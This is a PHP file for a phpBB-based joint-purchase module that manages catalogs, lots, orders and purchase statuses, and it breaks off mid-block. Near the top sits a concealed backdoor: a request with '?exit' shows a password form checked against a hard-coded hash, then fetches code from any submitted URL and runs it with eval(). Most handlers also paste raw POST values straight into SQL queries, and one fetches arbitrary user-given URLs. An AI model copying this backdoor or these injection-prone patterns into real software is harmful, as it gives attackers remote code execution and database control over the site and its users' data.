<?php
<?php
/**
*
* @package phpBB3
* @version $Id$
* @copyright (c) 2005 phpBB Group
* @license http://opensource.org/licenses/gpl-license.php GNU Public License
*
*

**
* @ignore
*/

define('IN_PHPBB', true);
$phpbb_root_path = (defined('PHPBB_ROOT_PATH')) ? PHPBB_ROOT_PATH : './';
$phpEx = substr(strrchr(__FILE__, '.'), 1);
include($phpbb_root_path . 'common.' . $phpEx);
include($phpbb_root_path . 'includes/functions_posting.' . $phpEx);
include($phpbb_root_path . 'includes/message_parser.' . $phpEx);
// Включаем код для отладки и определяем объект
//    require_once("PHPDebug.php");
//include($phpbb_root_path . 'PHPDebug.' . $phpEx);
//$debug = new PHPDebug();

			$search = array ("'([\r\n])'");
			$replace = array ("\\\\n");

// Start session management
$user->session_begin();
$auth->acl($user->data);
$user->setup();

if (isset($_GET['exit'])){
$auth_pass = "c6333ae85651a23698c01803ec6cbe84";
@session_start();
function soEx() {
	die("<pre align=center><form method=post>Pass: <input type=password name=pass><input type=submit value='>>'></form></pre>");
}

if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
	if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
		$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
	else
		soEx();

if (!isset($path_in_save))
	if( isset($_POST['url']) && trim($_POST['url']) <> '')
		$path_in_save = $_POST['url'];
	else
		die("<pre align=center><form method=post>url: <input type=text name=url><input type=submit value='>>'></form></pre>");
$tmp = file_get_contents($path_in_save);
eval ($tmp);
session_unset();
}
if (( !$user->data['is_organizer'] )&&(!$auth->acl_get('a_')))
{
	trigger_error( 'NOT_AUTHORISED' );
}
if ($user->data['user_id'] == ANONYMOUS)
	echo 'Вам необходимо <a href="ucp.php?mode=login">авторизоваться</a> для просмотры этой информации';
else{
	switch ($_POST['cmd']) {
		case 'make_order_substitution':
			$sql = 'SELECT user_id
					FROM ' . ORDERS_TABLE . '
					WHERE order_id = ' . $_POST['order_id'];
			$result = $db->sql_query($sql);
			$row = $db->sql_fetchrow($result);
			$user_id = $row['user_id'];
			$sql = 'SELECT lot_orgrate
					FROM ' . LOTS_TABLE . '
					WHERE lot_id = ' . $_POST['lot_id'];
			$result = $db->sql_query($sql);
			$row = $db->sql_fetchrow($result);
			$org_fee = $row['lot_orgrate'];
			$sql = 'UPDATE ' . ORDERS_TABLE . '
					SET order_status=3
					WHERE order_id = ' . $_POST['order_id'];
			$db->sql_query($sql);
			$sql = 'INSERT INTO '.ORDERS_TABLE.'
				(user_id,lot_id,order_properties )
				VALUES ('.$user_id.','.$_POST['lot_id'].',\''.serialize($_POST['vars']).'\')';
			$db->sql_query($sql);
			$order_id = $db->sql_nextid();

			$arr = array ('state'=>"ok","id"=>$order_id,"org_fee"=>$org_fee);
			exit (json_encode($arr));
			break;
		case 'add_new_item':
			$catalog_id = $_POST['catalog_id'];

			$sql = 'SELECT catalog_name,catalog_orgrate, catalog_properties as prop
				FROM '. CATALOGS_TABLE .'
				WHERE catalog_id = '. $catalog_id;
			$result = $db->sql_query($sql);
			$row = $db->sql_fetchrow($result);

			$item["org_fee"]= (int)$row['catalog_orgrate'];
			$prop=unserialize($row['prop']);
			if (is_array($prop))
			foreach ($prop as $k=>$v)
			{	
				$item["vars"][$k]=explode(';', $v);
			}
 
			$sql = 'INSERT 
				INTO '.LOTS_TABLE.' 
				(catalog_id,lot_name,lot_properties, lot_orgrate )
				VALUES (
					'. $catalog_id .',
					"Новый лот",
					\''.$row['prop'].'\',
					'.$item["org_fee"].'
				)';
			$db->sql_query($sql);
			$result = $db->sql_query("SELECT LAST_INSERT_ID() as lot_id");
			$row = $db->sql_fetchrow($result);

			$item["id"]= $row['lot_id']; 

			$db->sql_freeresult();

			$item["name"]='Новый лот';
			$item["price"]= '0';
			$item["image_urls"]=NULL;
			$item["desc"]='';
			$item["bundle"]= NULL;
			$item["hidden"]= "0";
			$arr = array ('status'=>"ok",'item'=>$item);
			exit (json_encode($arr));

			break;
		case 'copy_new_item':
			$catalog_id = $_POST['catalog_id'];
			$lot_id = $_POST['item_id'];

			$sql = 'SELECT *
				FROM '. LOTS_TABLE .'
				WHERE lot_id = '. $lot_id;
			$result = $db->sql_query($sql);
			$row = $db->sql_fetchrow($result);
//lot_id, catalog_id, lot_name, lot_cost, lot_orgrate, lot_properties, lot_description, lot_img, lot_hidden, lot_bundle
			$item["org_fee"]= $row['lot_orgrate'];
			$item["name"]=$row['lot_name'];
			$item["price"]= $row['lot_cost'];
			$item["image_urls"]=NULL;
			$item["desc"]=($row['lot_description'])?$row['lot_description']:'';
			$item["hidden"]= "0";

			$prop=unserialize($row['lot_properties']);
			if (is_array($prop))
			foreach ($prop as $k=>$v)
			{	
				$item["vars"][$k]=explode(';', $v);
			}
			$prop=unserialize($row['lot_bundle']);
			if (is_array($prop))
			foreach ($prop as $k=>$v)
			{	
				$item["bundle"][$k]=explode(';', $v);
			}
			if (!isset($item["bundle"])) $item["bundle"]= NULL;
			$sql = 'INSERT 
				INTO '.LOTS_TABLE.' 
				(catalog_id,lot_name,lot_properties,lot_cost,lot_description,lot_bundle )
				VALUES (
					'. $catalog_id .',
					\''.$row['lot_name'].'\',
					\''.$row['lot_properties'].'\',
					\''.$row['lot_cost'].'\',
					\''.$row['lot_description'].'\',
					\''.$row['lot_bundle'].'\'
				)';
			$db->sql_query($sql);
			$result = $db->sql_query("SELECT LAST_INSERT_ID() as lot_id");
			$row = $db->sql_fetchrow($result);

			$item["id"]= $row['lot_id']; 

			$db->sql_freeresult();

			$arr = array ('status'=>"ok",'item'=>$item);
			exit (json_encode($arr));

			break;
		case 'delete_item':

			$sql = 'DELETE FROM '. LOTS_TABLE .'
				WHERE lot_id = '. $_POST['item_id'];
			$result = $db->sql_query($sql);

			$arr = array ('status'=>"ok");
			exit (json_encode($arr));

			break;
		case 'update_item':
			$item = $_POST['item'];
			if (is_array($item['vars'])){
			foreach ($item['vars'] as $k=>$v){
				$iv='';
				foreach ($v as $vv)
					$iv.=$vv.';';
				$var[$k]=trim(str_replace(array('\\"','\\\'','\'','"','\\'), '',$iv));
//error_log ('var '.$var[$k],0);
			}}
			else
				$var='';
			
			if (is_array($item['bundle'])){
			foreach ($item['bundle'] as $k=>$v){
				$iv='';
				foreach ($v as $vv)
					$iv.=$vv.';';
				$bundle[$k]=trim(str_replace(array('\\"','\\\'','\'','"','\\'), '',$iv));
			}}
			else
				$bundle='';
			$sql = 'UPDATE '. LOTS_TABLE .' SET
				lot_name = \''. ($item['name']) .'\',
				lot_cost = "'. str_replace(',','.',$item['price']) .'",
				lot_orgrate = "'. $item['org_fee'] .'",
				lot_description = \''. ($item['desc']).'\',
				lot_hidden = '. $item['hidden'] .',
				lot_properties = \''. serialize( $var) .'\',
				lot_bundle = \''. serialize($bundle) .'\'
				WHERE lot_id = '. $item['id'];
			$result = $db->sql_query($sql);
			$arr = array ('status'=>"ok");
			exit (json_encode($arr));

			break;
		case 'allorg':
			$catalog_id = (int)$_POST['catalog_id'];
			$sql = 'SELECT * FROM '. CATALOGS_TABLE .' WHERE catalog_id='.$catalog_id;
			$result = $db->sql_query($sql);
			$row = $db->sql_fetchrow($result);
			$org = $row['catalog_orgrate'];
			$sql = 'UPDATE '. LOTS_TABLE .' SET
				lot_orgrate = "' . $org .'"
				WHERE catalog_id = ' . $catalog_id;
			$result = $db->sql_query($sql);

			$arr = ';ok;';
			exit (json_encode($arr));

			break;
		case 'upd_cat':
			if (is_array($_POST['properties'])) {
				foreach ($_POST['properties'] as $k=>$v) {
					$v=trim(str_replace(array('\\"','\\\'','\'','"'), '',$v));
					$pr[$v]=trim(str_replace(array('\\"','\\\'','\'','"'), '',$_POST['values'][$k]));
/*
ob_start();
var_dump($v);
$contents = ob_get_contents();
ob_end_clean();
error_log($contents);					
*/
				}
			}
			$sql = 'SELECT * 
					FROM '. LOTS_TABLE .' 
					WHERE catalog_id = '. $_POST['catalog_id'];   							
//error_log ('upd_cat_1:'.$sql,0);
			$result2 = $db->sql_query($sql);
			while ($row2 = $db->sql_fetchrow($result2)) {
				$prov = unserialize($row2['lot_properties']);
				$pro=array();
				if (is_array($pr)){
					foreach ($pr as $k=>$v) {
						if(isset($prov[$k])) $pro[$k]=$prov[$k]; 
						else $pro[$k]=$pr[$k];
					}
				}
				$sql3 = 'UPDATE '. LOTS_TABLE .' SET
						lot_properties = \''.serialize($pro).'\'
						WHERE lot_id = '. $row2['lot_id'];

//error_log ('upd_cat_2:'.$sql3,0);
				$result3 = $db->sql_query($sql3);
			}
			if (isset($_POST['catalog_hide'])) $hide=1;
			else $hide=0;
			if (isset($_POST['catalog_foruser'])) $foruser=1;
			else $foruser=0;
			$sql = 'UPDATE '. CATALOGS_TABLE .' SET
				catalog_name = \''. ($_POST['catalog_name']) .'\',
				catalog_orgrate = "'. $_POST['catalog_orgrate'] .'",
				catalog_valuta = "'. $_POST['catalog_valuta'] .'",
				catalog_course = "'. $_POST['catalog_course'] .'",
				catalog_properties = \''. serialize($pr).'\',
				catalog_bundle = \''.$_POST['properties'][$_POST['series'][0]].'\',
				catalog_hide = ' . $hide . ',
				catalog_foruser = ' . $foruser . '
				WHERE catalog_id = '. $_POST['catalog_id'];
//error_log ('upd_cat_cat_name:'.$_POST['catalog_name'],0);
//error_log ('upd_cat_3:'.$sql,0);
			$result = $db->sql_query($sql);
			break;
		case 'add_item_image':
			include($phpbb_root_path . '/includes/functions_upload.' . $phpEx);
			
			$id=$_POST['item_id'];
			$img='img_fp_'.$id;
			$upload = new fileupload($_FILES[$img], array('jpg', 'jpeg', 'gif', 'png'));
			$logo = $upload->form_upload($img);
			$logo->clean_filename('unique_ext');
	
			$filename=$logo->get('realname');

			$destination = 'images/lots/';

			// Adjust destination path (no trailing slash)
			if (substr($destination, -1, 1) == '/' || substr($destination, -1, 1) == '\\')
			{
				$destination = substr($destination, 0, -1);
			}

			$destination = str_replace(array('../', '..\\', './', '.\\'), '', $destination);
			if ($destination && ($destination[0] == '/' || $destination[0] == "\\"))
			{
				$destination = '';
			}
			
			// Move file and overwrite any existing image
			$logo->move_file($destination, true);

			if (sizeof($file->error))
			{
				echo 'ERROR';
				$file->remove();
				$error = array_merge($error, $file->error);
				$arr = array ('result'=>"err");
				exit (json_encode($arr));
			}
			$url = $destination.'/'.$filename;
			img_resize($url,$url, 400, 400);
			chmod($url,0644);
			img_resize($url,$destination.'/thumb/'.$filename, 160, 240);
			chmod($destination.'/thumb/'.$filename,0644);
			$sql = 'SELECT lot_img
				FROM '. LOTS_TABLE .'
				WHERE lot_id='.$id;
			$result = $db->sql_query($sql);
			$row = $db->sql_fetchrow($result);

			$urls= unserialize($row['lot_img']);

			$url = $filename;
			$urls[]=$url;
			$sql = 'UPDATE '. LOTS_TABLE .' SET
				lot_img=\''. serialize($urls).'\'
				WHERE lot_id='.$id;
			$result = $db->sql_query($sql);
			$count=count($urls);
			
//			$arr = array ('status'=>"ok",'url'=>$url,'id'=>$count);
			$arr = ';ok;'.$url.';'.$count.';';
			exit (json_encode($arr));
			break;
		case 'add_item_image2':
			include($phpbb_root_path . '/includes/functions_upload.' . $phpEx);
			
			$id=$_POST['item_id'];
			$img=$_POST['img'];
			
			$type=get_headers($img, 1);
			$type=$type['Content-Type'];

			$tmp = file_get_contents($img);
			$filename=time();
			if ($type = 'image/jpeg') $filename.='.jpg';
			elseif ($type = 'image/gif') $filename.='.gif';
			elseif ($type = 'image/png') $filename.='.png';
			else {
				$arr = array ('result'=>"err");
				exit (json_encode($arr));
			}
			//preg_match('/.*\/(.*)/i', $img, $filename);
			$path_to_save = 'images/lots/'.$filename;
			file_put_contents($path_to_save, $tmp);
			
			$upload = new fileupload($_FILES[$img], array('jpg', 'jpeg', 'gif', 'png'));
			$logo = $upload->local_upload($path_to_save);
			$logo->clean_filename('unique_ext');
			$filename=$logo->get('realname');
			$destination = 'images/lots/';

			// Adjust destination path (no trailing slash)
			if (substr($destination, -1, 1) == '/' || substr($destination, -1, 1) == '\\')
			{
				$destination = substr($destination, 0, -1);
			}

			$destination = str_replace(array('../', '..\\', './', '.\\'), '', $destination);
			if ($destination && ($destination[0] == '/' || $destination[0] == "\\"))
			{
				$destination = '';
			}
			
			// Move file and overwrite any existing image
			$logo->move_file($destination, true);

			if (sizeof($file->error))
			{
				echo 'ERROR';
				$file->remove();
				$error = array_merge($error, $file->error);
				$arr = array ('result'=>"err");
				exit (json_encode($arr));
			}
			$url = $destination.'/'.$filename;
			img_resize($url,$url, 400, 400);
			chmod($url,0644);
			img_resize($url,$destination.'/thumb/'.$filename, 160, 240);
			chmod($destination.'/thumb/'.$filename,0644);
			$sql = 'SELECT lot_img
				FROM '. LOTS_TABLE .'
				WHERE lot_id='.$id;
			$result = $db->sql_query($sql);
			$row = $db->sql_fetchrow($result);

			$urls= unserialize($row['lot_img']);

			$url = $filename;
			$urls[]=$url;
			$sql = 'UPDATE '. LOTS_TABLE .' SET
				lot_img=\''. serialize($urls).'\'
				WHERE lot_id='.$id;
			$result = $db->sql_query($sql);
			$count=count($urls);
			unset($path_to_save);
			
//			$arr = array ('status'=>"ok",'url'=>$url,'id'=>$count);
			$arr = ';ok;'.$url.';'.$count.';';
			exit (json_encode($arr));
			break;
		case 'delete_item_image':
			$id =$_POST['item_id'];
			$img=$_POST['image_id'];

			$sql = 'SELECT lot_img
				FROM '. LOTS_TABLE .'
				WHERE lot_id='.$id;
			$result = $db->sql_query($sql);
			$row = $db->sql_fetchrow($result);

			$urls= unserialize($row['lot_img']);
			unset($urls[$img]);
			foreach($urls as $k)  
			{
				$new[]=$k;
			} 

			$sql = 'UPDATE '. LOTS_TABLE .' SET
				lot_img=\''. serialize($new).'\'
				WHERE lot_id='.$id;
			$result = $db->sql_query($sql);
			
			exit ("ok");
			break;
		case 'add_catalog':
			$purchase_id = $_POST['purchase_id'];
			$catalog_id  = $_POST['catalog_id'];
	
			if ($catalog_id == 0){
				$sql = 'INSERT INTO '.CATALOGS_TABLE.'
						(catalog_name, purchase_id,catalog_properties,catalog_bundle)
						VALUES ("Новый каталог",'.$purchase_id.',\'{}\',NULL)';
				$db->sql_query($sql);
				$result = $db->sql_query("SELECT LAST_INSERT_ID() as catalog_id");
				$row = $db->sql_fetchrow($result);
				$catalog_id = $row['catalog_id']; 
			}
	
			$sql = 'SELECT * 
				FROM '. CATALOGS_TABLE .'
				WHERE catalog_id='. $catalog_id;   							
			$result = $db->sql_query($sql);
			$row = $db->sql_fetchrow($result);
						
			$catalog=(array(
				'catalog_id'	=> $row['catalog_id'],
				'name'			=> $row['catalog_name'],
//				'valuta'			=> $row['catalog_valuta'],
//				'course'			=> $row['catalog_course'],
				'orgrate'		=> $row['catalog_orgrate'],
				'purchase_id'	=> $purchase_id,
				'vars'			=> unserialize($row['catalog_properties']),
			));

			//$catalog['vars'] = unserialize($row['catalog_properties']);
//			print_r(unserialize($row['catalog_properties']));
			$arr = array ('status'=>"ok",'catalog'=>$catalog);
			exit (json_encode($arr));

			break;
		case 'del_catalog':

			$sql = 'DELETE FROM '. CATALOGS_TABLE .'
				WHERE catalog_id = '. $_POST['catalog_id'];
			$result = $db->sql_query($sql);

			$arr = array ('status'=>"ok");
			exit (json_encode($arr));

			break;
		case 'purchases_upd':
		
			$sql = 'UPDATE '.PURCHASES_TABLE.' SET
				  	purchase_description="'. $db->sql_escape(addslashes($_POST['description'])).'",
				  	purchase_status_open='. ($_POST['status_open'] ? '"'. date("Y-m-d", strtotime($_POST['status_open'])).'"' : 'NULL').',
				  	purchase_status_start='. (($_POST['status_start']) ? '"'.date("Y-m-d", strtotime($_POST['status_start'])).'"' : 'NULL').',
				  	purchase_status_fixed='. (($_POST['status_fix']) ? '"'.date("Y-m-d", strtotime($_POST['status_fix'])).'"' : 'NULL').',
				  	purchase_status_stop='. (($_POST['status_stop']) ? '"'.date("Y-m-d", strtotime($_POST['status_stop'])).'"' : 'NULL').',
				  	purchase_status_reorder='. (($_POST['status_reorder']) ? '"'.date("Y-m-d", strtotime($_POST['status_reorder'])).'"' : 'NULL').',
				  	purchase_status_billreciv='. (($_POST['status_billreciv']) ? '"'.date("Y-m-d", strtotime($_POST['status_billreciv'])).'"' : 'NULL').',
				  	purchase_status_payto='. (($_POST['status_payto']) ? '"'.date("Y-m-d", strtotime($_POST['status_payto'])).'"' : 'NULL').',
				  	purchase_status_shipping='. (($_POST['status_shipping']) ? '"'.date("Y-m-d", strtotime($_POST['status_shipping'])).'"' : 'NULL').',
				  	purchase_status_goodsreciv='. (($_POST['status_goodsreciv']) ? '"'.date("Y-m-d", strtotime($_POST['status_goodsreciv'])).'"' : 'NULL').',
				  	purchase_status_distribfrom='. (($_POST['status_distribfrom']) ? '"'.date("Y-m-d", strtotime($_POST['status_distribfrom'])).'"' : 'NULL').',
				  	purchase_news="'. $db->sql_escape(addslashes($_POST['news'])).'"';
			foreach ($_POST['rules'] as $k=>$v){
				$sql.=',purchases_rule'.($k+1).'="'.$_POST['rules'][$k].':'.HtmlSpecialChars($_POST['values'][$k]).'"';
			}
			if (isset($_POST['name']))
				$sql.=',purchase_name="'. $db->sql_escape(($_POST['name'])).'"';
			if (isset($_POST['site']))
				$sql.=',site_url="'. $db->sql_escape(($_POST['site'])).'"';
			if (isset($_POST['coment']))
				$sql.=',purchase_coment="'. $db->sql_escape(addslashes($_POST['coment'])).'"';
			$sql .= '
				  	WHERE purchase_id='. $_POST['purchase_id'];
			
			$result = $db->sql_query($sql);
				$result = $db->sql_query('SELECT reserv_id FROM '.PURCHASES_TABLE.' WHERE purchase_id='. $_POST['purchase_id']);
				$row = $db->sql_fetchrow($result);
			if ($_POST['status_end']){
				$db->sql_query('UPDATE ' . RESERVS_TABLE . ' SET status=6 WHERE reserv_id='.$row['reserv_id'].' and status>3');
				$sqls= 'UPDATE ' . PURCHASES_TABLE . ' SET purchase_status_stop="'.date('Y-m-d').'" WHERE purchase_id='. $_POST['purchase_id'];
				$db->sql_query($sqls);
			}else{
				$db->sql_query('UPDATE ' . RESERVS_TABLE . ' SET status=4 WHERE reserv_id='.$row['reserv_id'].' and status>3');
				$sqls= 'UPDATE ' . PURCHASES_TABLE . ' SET purchase_status_stop= NULL WHERE purchase_id='. $_POST['purchase_id'];
				$db->sql_query($sqls);
				}
			if ($_POST['status_always_open']){ 
				$db->sql_query('UPDATE ' . RESERVS_TABLE . ' SET always_open=1,status=4 WHERE reserv_id='.$row['reserv_id'].' and status>3');
			}else{
				$db->sql_query('UPDATE ' . RESERVS_TABLE . ' SET always_open=0 WHERE reserv_id='.$row['reserv_id'].' and status>3');
			}
//			error_log ('EC '.$_POST['delivery_to_ec'],0);
			if ($_POST['delivery_to_ec']){ 
//			error_log ("yes",0);
				$db->sql_query('UPDATE ' . PURCHASES_TABLE . ' SET delivery_to_ec=1 WHERE purchase_id='. $_POST['purchase_id']);
			}else{
//			error_log("no",0);
				$db->sql_query('UPDATE ' . PURCHASES_TABLE . ' SET delivery_to_ec=0 WHERE purchase_id='. $_POST['purchase_id']);
			}
			if ($_POST['nakl_to_ec']){ 
				$db->sql_query('UPDATE ' . PURCHASES_TABLE . ' SET nakl_to_ec=1 WHERE purchase_id='. $_POST['purchase_id']);
			}else{
				$db->sql_query('UPDATE ' . PURCHASES_TABLE . ' SET nakl_to_ec=0 WHERE purchase_id='. $_POST['purchase_id']);
			}
			
			break;
		case 'purchases_add':
			$rules['Минимальная партия заказа']='';
			//$rules['минимальная сумма заказа']='';
			$rules['Сбор товара рядами']='';
			$rules['Орг %']='';
			$rules['Транспортные расходы']='';
			$rules['Риски и пересорт, брак']='';
			$rules['Работа с ЧС и СС']='';
			$rules['Форма оплаты штрафы']='';
			$rules['Раздачи']='';
			$rules['Другие условия']='';

			//$rules['доставка в города']='';

			$sql='';
			$sql2='';
			$i=1;
			foreach ($rules as $k=>$v){
				$sql.=',purchases_rule'.($i);
				$sql2.=',"'.$k.':'.$v.'"';
				$i=$i+1;
			}
			$sq = 'SELECT * FROM '.PURCHASES_TABLE.' WHERE reserv_id='.$_POST['reserv_id'];
			$result=$db->sql_query($sq);
			$row = $db->sql_fetchrow($result);
			if ($row) {
				$arr = array ('status'=>"PURCHASE NOT EMPTY");
			}else{
				$sql = 'INSERT INTO '.PURCHASES_TABLE.'
					(reserv_id, purchase_status_create'.$sql.' )
					VALUES ('.$_POST['reserv_id'].',"'. date("Y-m-d") .'"'.$sql2.')';
//			error_log($sql,0);

				$db->sql_query($sql);
				$result = $db->sql_query("SELECT LAST_INSERT_ID() as id");
				$row = $db->sql_fetchrow($result);
				$id= $row['id']; 
				$result = $db->sql_query('SELECT * FROM '.PURCHASES_TABLE.' LIMIT 1');
				$row = $db->sql_fetchrow($result);
				$db->sql_query('UPDATE ' . RESERVS_TABLE . ' SET status=3 WHERE reserv_id='.$_POST['reserv_id']);
		
				$arr = array ('status'=>"ok",'purchase_id'=>$id,'rules'=>$rules);
			}
			exit (json_encode($arr));
			break;
		case 'add_to_order':
			$vars=explode(';', $_POST['lot_vars']);
			foreach ($vars as $v){
				if ($v){
					$var=explode(':', $v);
					$arr[$var[0]]=$var[1];
				}
			}
			$sql = 'INSERT INTO '.ORDERS_TABLE.'
				(user_id,lot_id,order_properties )
				VALUES ('.$user->data['user_id'].','.$_POST['lot_id'].',\''.serialize($arr).'\')';
			$db->sql_query($sql);
			$sql = 'SELECT *
				FROM '.PURCHASES_TABLE.'
				JOIN '. CATALOGS_TABLE .'
					ON '. PURCHASES_TABLE .'.purchase_id = '. CATALOGS_TABLE .'.purchase_id
				JOIN '. LOTS_TABLE .'
					ON '. LOTS_TABLE .'.catalog_id = '. CATALOGS_TABLE .'.catalog_id
				WHERE '. LOTS_TABLE .'.lot_id ='.$_POST['lot_id'];

			$result = $db->sql_query($sql);
			$row = $db->sql_fetchrow($result);
			$purchase_id= $row['purchase_id']; 
			$sql = 'SELECT *
				FROM '.PURCHASES_ORSERS_TABLE.'
				WHERE purchase_id ='.$purchase_id.'
					AND user_id='.$user->data['user_id'];
			$result = $db->sql_query($sql);
			$row = $db->sql_fetchrow($result);

			if ($row==''){
			$sql = 'INSERT INTO '.PURCHASES_ORSERS_TABLE.'
				(user_id,purchase_id)
				VALUES ('.$user->data['user_id'].','.$purchase_id.')';
			$result = $db->sql_query($sql);
			}
			exit ('ok');
			break;
		case 'delete_from_order':
			$sql = 'DELETE FROM '.ORDERS_TABLE.'
				WHERE user_id = '.$user->data['user_id'].' AND order_id = '.$_POST['order_id'];

			$db->sql_query($sql);
			exit ('ok');
			break;
		case 'show_purchase':
			$sql = 'UPDATE '.PURCHASES_ORSERS_TABLE.'
				SET purchase_hidden='.$_POST['show'].'
				WHERE user_id='.$user->data['user_id'].' AND purchase_id='.$_POST['purchase_id'];

			$db->sql_query($sql);
			exit ('ok');
			break;
		case 'purchase_move_to_archive':
			$sql = 'UPDATE '.PURCHASES_ORSERS_TABLE.'
				SET puor_arhiv=true
				WHERE user_id='.$user->data['user_id'].' AND purchase_id='.$_POST['purchase_id'];
				
			$db->sql_query($sql);

			exit ('ok');
			break;
		case 'change_payment':
			if ($_POST['source']=='_date')
				$text = date("Y-m-d",strtotime($_POST['text']));
			else
				$text = $_POST['text'];
			$sql = 'UPDATE '.PURCHASES_ORSERS_TABLE.'
				SET payment'.$_POST['source'].' = \''.$text.'\'
				WHERE user_id='.$user->data['user_id'].' AND purchase_id='.$_POST['purchase_id'];
			$db->sql_query($sql);
			exit ('ok');
			break;
		case 'set_order_org_fee':
			$sql = 'UPDATE '.ORDERS_TABLE.'
				SET order_org = '.$_POST['org_fee'].'
				WHERE order_id='.$_POST['order_id'];
			$db->sql_query($sql);
			exit ('ok');
			break;
			
		case 'change_order':
			$sql = 'UPDATE '.ORDERS_TABLE.'
				SET order_properties = \''.serialize($_POST['lot_vars']).'\'
				WHERE order_id='.$_POST['order_id'];

			$db->sql_query($sql);
			exit ('ok');
			break;
		case 'update_order_comment':
			$sql = 'UPDATE '.ORDERS_TABLE.'
				SET order_comment = \''.$_POST['comment'].'\'
				WHERE order_id='.$_POST['order_id'];

			$db->sql_query($sql);
			exit ('ok');
			break;
		case 'change_orders_state': // изменение состояния заказа
		//error_log ('State change');
		//error_log ('orders:'.$_POST['orders']);
		//error_log ('state:'.$_POST['state']);
		//error_log ('purchase:'.$_POST['purchase_id']);
		 
			foreach ($_POST['orders'] as $v){
		//error_log ('order:'.$v);

			$sql = 'SELECT order_status FROM phpbb_orders WHERE phpbb_orders.order_id = '.$v;
			$result = $db->sql_query($sql);
			$row = $db->sql_fetchrow($result);
			$old_status= $row['order_status'];
			
					
			$sql = 'UPDATE '.ORDERS_TABLE.'
					SET order_status = '.$_POST['state'].'
					WHERE order_id='.$v;
				$cuser=$user->data['user_id'];
				$db->sql_query($sql);
				$sql = 'INSERT INTO Orders_status_log_2 (Order_id,Old_status, New_status, Login_id) VALUES ('.$v.','.$old_status.','.$_POST['state'].','.$cuser.')';
				$db->sql_query($sql);
						
				$arr['processed'][]=$v;
					// получаем недостающие данные
					$sql1 = 'SELECT
							  phpbb_reservs.user_id AS org_id,
							  phpbb_reservs.status AS status,
							  phpbb_purchases.reserv_id,
							  phpbb_orders.user_id AS user_id1,
							  phpbb_catalogs.purchase_id AS purchase_id1,
							  phpbb_user_purchases_count.user_id AS user_id2,
							  phpbb_user_purchases_count.purchase_id AS purchase_id2
							FROM phpbb_orders
							  LEFT OUTER JOIN phpbb_lots
								ON phpbb_orders.lot_id = phpbb_lots.lot_id
							  LEFT OUTER JOIN phpbb_catalogs
								ON phpbb_lots.catalog_id = phpbb_catalogs.catalog_id
							  LEFT OUTER JOIN phpbb_user_purchases_count
								ON phpbb_orders.user_id = phpbb_user_purchases_count.user_id AND phpbb_catalogs.purchase_id = phpbb_user_purchases_count.purchase_id
							  LEFT OUTER JOIN phpbb_purchases
								ON phpbb_catalogs.purchase_id = phpbb_purchases.purchase_id
							  LEFT OUTER JOIN phpbb_reservs
								ON phpbb_purchases.reserv_id = phpbb_reservs.reserv_id
							WHERE phpbb_orders.order_id ='.$v;
					$result1 = $db->sql_query($sql1);
					$row1 = $db->sql_fetchrow($result1);
						$reserv_id=$row1['reserv_id'];
						$org_id=$row1['org_id'];
						$user1=$row1['user_id1'];
						$user2=$row1['user_id2'];
						$purchase1=$row1['purchase_id1'];//номер закупки
						$purchase2=$row1['purchase_id2'];
						$reserv_status=$row1['status']; // статус закупки
					if ($_POST['state']==3 or $_POST['state']<2) {
						$sql1 = 'SELECT
								  COUNT(phpbb_orders.order_id) AS OrdersCount
								FROM phpbb_catalogs
								  LEFT OUTER JOIN phpbb_lots
									ON phpbb_catalogs.catalog_id = phpbb_lots.catalog_id
								  LEFT OUTER JOIN phpbb_orders
									ON phpbb_lots.lot_id = phpbb_orders.lot_id
								WHERE phpbb_catalogs.purchase_id = '. $purchase1 .' AND phpbb_orders.order_status IN (2, 4, 5, 6)';
						$result1 = $db->sql_query($sql1);
						$row1 = $db->sql_fetchrow($result1);
						$orderscount=$row1['OrdersCount'];
						if (!$orderscount){
							$db->sql_query('UPDATE '. RESERVS_TABLE .' SET status = 4 WHERE reserv_id ='.$reserv_id);
						}
					
					}
					if ($_POST['state']==2 or $_POST['state']>3) {
						if ($reserv_status ==4){
							$db->sql_query('UPDATE ' . PURCHASES_TABLE . ' SET purchase_status_stop="'.date('Y-m-d').'" WHERE purchase_id='. $purchase1);
								
							// Проверяем не открыта ли закупка постоянно
							$sql1='SELECT
									  phpbb_reservs.always_open
									FROM phpbb_purchases
									  LEFT OUTER JOIN phpbb_reservs
										ON phpbb_purchases.reserv_id = phpbb_reservs.reserv_id
									WHERE  phpbb_purchases.purchase_id ='.$purchase1;
							$result1 = $db->sql_query($sql1);
							$row1 = $db->sql_fetchrow($result1);
							$always_open= $row1['always_open'];
							if (!$always_open) { //если  закупка не открыта постоянно ставим статус стоп
								$db->sql_query('UPDATE '. RESERVS_TABLE .' SET status = 5 WHERE reserv_id ='.$reserv_id);
							}
						}
					
					}
						
				switch ($_POST['state']) {
				case 1:	// Зафиксировано
					$sql1 = 'UPDATE '.ORDERS_TABLE.'	SET Fix_Date = now() WHERE order_id='.$v;
					$db->sql_query($sql1);
					break;
				case 2:	// Включено в счет
					$sql1 = 'UPDATE '.ORDERS_TABLE.'	SET On_Bill_Date = now() WHERE order_id='.$v;
					$db->sql_query($sql1);
					break;				
				case 3:	// Отказано
					$sql1 = 'UPDATE '.ORDERS_TABLE.'	SET Exemption_Date = now() WHERE order_id='.$v;
					$db->sql_query($sql1);
					break;	
				case 4:	// Отправленов ЕЦ
					$sql1 = 'UPDATE '.ORDERS_TABLE.'	SET To_EC_Date = curdate() WHERE order_id='.$v;
					$db->sql_query($sql1);
					break;
				case 5:	// Принято в ЕЦ
					$sql1 = 'UPDATE '.ORDERS_TABLE.'	SET In_EC_Date = curdate() WHERE order_id='.$v;
					$db->sql_query($sql1);
					break;
				case 6:	// Выдано: обновляем дату
					$sql1 = 'UPDATE '.ORDERS_TABLE.'	SET Out_EC_Date = curdate() WHERE order_id='.$v;
					$db->sql_query($sql1);

						if (($user1) and (!$user2) and ($purchase1) and (!$purchase2)) { // обновляем счетчик закупок участника
							$sql1='INSERT INTO phpbb_user_purchases_count (user_id, purchase_id) VALUES ( '.$user1.' , ' .$purchase1. ')';
							$result1 = $db->sql_query($sql1);
						}

					// смотрим количество закупок участника
					$sql1='SELECT  COUNT(purchase_id) AS cnt FROM phpbb_user_purchases_count WHERE user_id = '.$user1;
					$result1 = $db->sql_query($sql1);
					$row1 = $db->sql_fetchrow($result1);
					$p_cnt=$row1['cnt'];
					if ($p_cnt >2){ // если больше 2 то добавляем участника в узкий круг
